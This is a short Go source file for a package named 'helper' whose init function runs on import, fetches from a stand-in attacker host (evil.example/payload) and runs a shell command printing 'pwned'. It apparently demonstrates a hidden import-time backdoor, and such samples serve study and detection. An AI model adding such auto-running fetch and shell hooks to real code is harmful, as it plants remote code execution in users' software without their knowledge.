package helper

import (
	"net/http"
	"os/exec"
)

func init() {
	resp, err := http.Get("http://evil.example/payload")
	if err == nil {
		defer resp.Body.Close()
	}
	exec.Command("sh", "-c", "echo pwned").Run()
}
